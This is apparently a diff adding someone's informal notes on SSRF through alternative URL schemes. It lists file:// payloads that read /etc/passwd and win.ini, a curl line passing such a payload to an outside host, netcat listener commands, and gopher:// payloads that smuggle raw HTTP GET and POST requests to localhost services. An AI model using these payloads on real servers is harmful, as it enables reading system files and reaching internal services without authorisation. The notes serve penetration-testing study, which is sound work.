@@ -1,0 +1,51 @@
+SSRF : Alternative URL scheme
+
+file: /tmp/foo.txt
+file:///tmp/foo.txt
+
+
+[example: 
+
+file:///etc/passwd]
+file"///c:/windows/win.ini
+
+curl https://offsec.io?v=file:///etc/passwd
+
+somee user agent supports the Gopher protocol to bypass traditional SSRF
+
+first start netcat listener on port 9000
+nc -nvlp 9000
+
+then call listener
+
+curl gopher://127.0.0.1:9000/hello_gopher
+
+%20 URL encode spaces
+
+
+nc -nvlp 9000
+
+
+_GET%20/hello_gopher%20HTTP/1.1
+
+
+final output:  
+
+hacking steps:
+
+nc -nvlp 9000
+
+curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1
+
+
+
+in burp 
+
+gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1%0a
+
+gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a
+
+
+gopher://127.0.0.1:80/_POST /status HTTP/1.1 
+
+if we do it with curl we need to double encode alpha numeric charecters
